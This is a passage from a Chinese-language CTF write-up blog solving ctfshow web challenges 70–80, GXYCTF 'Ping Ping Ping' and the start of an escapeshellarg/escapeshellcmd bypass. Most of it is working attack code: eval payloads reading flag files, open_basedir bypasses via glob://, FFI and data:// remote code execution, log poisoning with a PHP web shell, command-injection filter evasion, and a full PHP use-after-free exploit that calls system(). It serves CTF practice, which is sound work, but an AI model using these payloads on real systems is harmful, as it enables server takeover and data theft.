class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231112234828265.png" alt="image-20231112234828265"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;../../../&#x27;));</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231112234920206.png" alt="image-20231112234920206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><p>ctfshow{45196993-0443-457f-912f-ce1bbb25c890}</p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>下载题目附件,内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">//获取输出缓冲区的内容</span></span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();  <span class="comment">//清空缓冲区</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>); <span class="comment">//替换为问号&#x27;?&#x27;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样会导致我们得到的数据变成无法识别的问号</p><p><img src="/img/image-20231120214646113.png" alt="image-20231120214646113"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);exit(); </span><br></pre></td></tr></table></figure><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>用上一题的payload试一试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);exit(); </span><br></pre></td></tr></table></figure><p><img src="/img/image-20231120215859623.png" alt="image-20231120215859623"></p><p>没有那个文件，我们扫描一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">c=$a=scandir(&#x27;/&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231120220006750.png" alt="image-20231120220006750"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));exit();</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231120220033245.png" alt="image-20231120220033245"></p><p>var_dump被禁用，并且还有open_basedir限制读取目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/image-20231123213548451.png" alt="image-20231123213548451"></p><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>由于存在<code>open_basedir</code>配置的限制，无法使用<code>scandir</code>函数列出目录信息，可以使用<code>glob</code>协议绕过<code>open_basedir</code>的限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(0);  #扫描根目录有什么文件</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;getFilename().&quot; &quot;);&#125; exit(0);</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit(0);</span><br><span class="line">c=require(&#x27;/flagc.txt&#x27;);exit(0);</span><br><span class="line">c=include_once(&#x27;/flagc.txt&#x27;);exit(0);</span><br><span class="line">c=require_once(&#x27;/flagc.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure><p>另一种读取文件的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = &quot;glob:///*.txt&quot;;</span><br><span class="line">if ( $b =opendir($a) )&#123;</span><br><span class="line">while ( ($file = readdir($b)) !== false )&#123;</span><br><span class="line">echo &quot;filename:&quot;.$file.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">closedir($b);</span><br><span class="line">&#125;exit();</span><br></pre></td></tr></table></figure><p>他们的共同点是使用了glob:&#x2F;&#x2F;伪协议来读取文件</p><h3 id="web-75"><a href="#web-75" class="headerlink" title="web 75"></a>web 75</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;getFilename().&quot; &quot;);&#125; exit(0);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;); $sql = &quot;select load_file(&#x27;/flag36.txt&#x27;) as a&quot;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row))&#123; echo $result[&#x27;a&#x27;]; &#125; exit(); </span><br></pre></td></tr></table></figure><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&quot;ls /&quot;); ?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&quot;tac ./flag.*&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= eval($_POST[1]); ?&gt;</span><br><span class="line">post:1=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231126145455076.png" alt="image-20231126145455076"></p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件头写入：User-Agent:&lt;?php eval($_POST[1]); ?&gt;</span><br><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line">post：1=system(&quot;tac ./fl0g.php&quot;);</span><br></pre></td></tr></table></figure><p>通过将恶意代码写入日志，再包含日志，传入参数，执行</p><h2 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h2><p><code>/?ip=127.0.0.1;ls</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"></span><br><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以<code>/?ip=127.0.0.1|ls</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"></span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/?ip=127.0.0.1;tac flag.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= fxck your space!</span><br></pre></td></tr></table></figure><p>看来空格被过滤了</p><p><code>?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= 1fxck your symbol!</span><br></pre></td></tr></table></figure><p><code>/?ip=127.0.0.1;cat$IFS$1flag.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= fxck your flag!</span><br></pre></td></tr></table></figure><p>发现flag也被过滤了<br>过滤了这么多，现在就先去看看index.php</p><p><code>/?ip=127.0.0.1;cat$IFS$1index.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure><p>1、简单变量替换,覆盖拼接flag<br><code>/?ip=127.0.0.1;a=l;tac$IFS$9f$aag.php</code></p><p><code>/?ip=127.0.0.1;b=ag.php;a=fl;tac$IFS$9$a$b</code></p><p>2、内联执行<br>反引号在linux中作为内联执行，就是将反引号内命令的输出作为输入执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;tac$IFS$9`ls`</span><br></pre></td></tr></table></figure><p>能当做system一样执行ls命令，ls的结果为flag.php和index.php<br>所以意思为：<br>?ip&#x3D;127.0.0.1;tac flag.php index.php</p><p>ps:cat和tac的区别:tac命令与cat命令展示内容相反，用于将文件以行为单位的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。cat指令把flag.php的内容导出后依然遵循php的语法，那么没有echo语句，就无法显示，而tac指令将一切倒过来后：就不是php语句了，在html语句里就就会直接显示出来</p><p><strong>1、call_user_func_array()</strong></p><p> call_user_func_array(<a href="https://www.php.net/manual/zh/language.types.callable.php">callable</a> <code>$callback</code>, array <code>$args</code>): mixed<br>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>args</code>）为回调函数的的参数传入</p><p><code>$_SERVER[&#39;SERVER_ADDR&#39;]</code>：当前运行脚本所在的服务器的 IP 地址<br><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>：客户端 IP 地址或者是代理<br>Nmap -oG 将命令和结果写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$host = $_GET[&#x27;host&#x27;];</span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line">echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br></pre></td></tr></table></figure><p>escapeshellarg()+escapeshellcmd()之殇<br>传入参数：127.0.0.1’ -v -d a&#x3D;1<br>经过escapeshellarg()函数处理后变为：<code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code>，也就是将其中的’单引号转义，再用单引号将内容包含起来<br>处理完的字符串再通过escapeshellcmd()函数的处理，变成：<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，因为escapeshellcmd()函数对\以及最后的未闭合的’进行了转义<br>由于两次函数的处理，最终参数可简化成：<code>127.0.0.1\ -v -d 